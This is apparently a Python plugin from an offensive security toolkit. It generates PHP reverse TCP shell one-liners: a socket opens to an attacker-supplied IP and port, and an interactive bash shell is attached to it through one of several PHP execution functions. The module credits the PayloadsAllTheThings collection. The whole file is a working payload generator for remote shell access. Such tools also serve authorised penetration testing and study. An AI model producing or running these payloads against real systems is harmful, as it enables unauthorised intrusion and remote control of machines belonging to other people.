from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--exec",
            default="system",
            choices=[
                "exec",
                "shell_exec",
                "system",
                "passthru",
                "popen",
                "back_quote",
                "proc_open"
            ]
        )
        self.opts.description = "[ReverseShell][TCP] PHP from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = """php -r '$sock=fsockopen("{}",{});""".format(self.args.ip, self.args.port)
        if self.args.exec == "back_quote":
            self.shell += """`{} -i <&3 >&3 2>&3`;'""".format(self.args.shell)
        elif self.args.exec == "proc_open":
            self.shell += """$proc=proc_open("{} -i",""".format(self.args.shell)
            self.shell += "array(0=>$sock, 1=>$sock,2=>$sock),$pipes);'"
        else:
            self.shell += """{}("{} -i <&3 >&3 2>&3");'""".format(self.args.exec, self.args.shell)
